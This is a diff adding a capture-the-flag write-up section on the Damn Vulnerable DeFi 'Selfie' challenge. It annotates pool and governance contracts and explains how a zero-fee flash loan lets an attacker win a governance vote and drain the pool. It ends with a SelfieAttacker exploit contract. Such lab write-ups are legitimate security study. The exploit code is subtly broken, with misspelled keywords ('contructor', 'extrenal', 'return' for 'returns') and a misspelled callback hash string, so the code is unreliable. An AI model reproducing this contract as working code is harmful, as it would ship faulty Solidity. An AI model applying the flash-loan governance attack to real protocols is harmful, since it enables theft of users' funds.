@@ -245,3 +245,128 @@ add huge gas limit during test in cmd /toml file:
 ```
 --gas-limit 99999999999999999999999999999
 ```
+## 6. Selfie
+
+In ```selfiepool.sol``` :
+```
+// @audit-info Only the governance address that is set in the contructor can bypass this modifier
+    modifier onlyGovernance() {
+        if (msg.sender != address(governance)) {
+            revert CallerNotGovernance();
+        }
+        _;
+    }
+
+    constructor(IERC20 _token, SimpleGovernance _governance) {
+        token = _token;
+        governance = _governance;
+    }
+    
+    // @audit-info max flash loan is the balance of the token in the pool
+    function maxFlashLoan(address _token) external view returns (uint256) {
+        if (address(token) == _token) {
+            return token.balanceOf(address(this));
+        }
+        return 0;
+    }
+
+    // @audit-info the flash loan fees is always 0 for all tokens
+    function flashFee(address _token, uint256) external view returns (uint256) {
+        if (address(token) != _token) {
+            revert UnsupportedCurrency();
+        }
+        return 0;
+    }
+
+    function flashLoan(IERC3156FlashBorrower _receiver, address _token, uint256 _amount, bytes calldata _data)
+        external
+        nonReentrant
+        returns (bool)
+    {
+        if (_token != address(token)) {
+            revert UnsupportedCurrency();
+        }
+        // 2audit-info receiver need to implement the onFlashLoan function and pay back the loan
+        token.transfer(address(_receiver), _amount);
+        if (_receiver.onFlashLoan(msg.sender, _token, _amount, 0, _data) != CALLBACK_SUCCESS) {
+            revert CallbackFailed();
+        }
+        // @audit-ok trying to transfer the amount back to the pool, if it fails, it will revert
+        if (!token.transferFrom(address(_receiver), address(this), _amount)) {
+            revert RepayFailed();
+        }
+
+        return true;
+    }
+    // @audit interesting way to drain the pool
+    // @audit can we be governnace?
+    function emergencyExit(address receiver) external onlyGovernance {
+        uint256 amount = token.balanceOf(address(this));
+        token.transfer(receiver, amount);
+
+        emit EmergencyExit(receiver, amount);
+    }
+```
+
+In ```simplegovernance.sol``` :
+
+```
+ // @audit-info checks if the sender has more than half of the total supply of the voting token
+    // @audit-issue this is a broken governance mechanism. Only if 1 actor control more than 50%
+    // of the token supply he can make proposals. Also they can have more than 50 percent of the token supply
+    //just by taking a flashloan from the pool with 0% fee and pass a proposal to drain the pool
+
+    function _hasEnoughVotes(address who) private view returns (bool) {
+        uint256 balance = _votingToken.getVotes(who);
+        uint256 halfTotalSupply = _votingToken.totalSupply() / 2;
+        return balance > halfTotalSupply;
+    }
+```
+test-file
+```
+import {IERC3156FlashBorrower} from "@openzeppelin/contracts/interfaces/IERC3156FlashBorrower.sol";
+
+contract SelfieAttacker is IERC3156FlashBorrower{
+    address recovery;
+    SelfiePool pool;
+    SimpleGovernance governance;
+    DamnValuableVotes token;
+    uint actionId;
+    bytes32 private constant CALLBACK_SUCCESS = keccak256("ERC3156FlahBorrower.onFlashLoan");
+
+    contructor(
+        address _pool,
+        address _governance,
+        address _token,
+        address _recovery
+    ){
+        pool=SelfiePool(_pool);
+        governance = SimpleGovernance(_governance);
+        token=DamnValuableVotes(_token);
+        recovery=_recovery;
+    }
+    function onFlashLoan(
+        address _initiator,
+        address ,
+        uint256 _amount,
+        uint256 _fee,
+        bytes calldata
+    )external return (bytes32){
+        require(msg.sender==address(pool),"SelfEAttacker: Only pool can call");
+        require(_initiator==address(this),"SelfieAttacker:Initiator is not self");
+
+        token.delegate(address(this));
+        uint _actionId=governance.queueAction(
+            address(pool),
+            0,
+            abi.encodeWithSignature("emergencyExit(address)", recovery)
+        );
+        actionId=_actionId;
+        token.approve(address(pool),_amount+_fee);
+        return CALLBACK_SUCCESS;
+    }
+    function executeProposal()extrenal{
+        governance.executeAction(actionId);
+    }
+}
+```
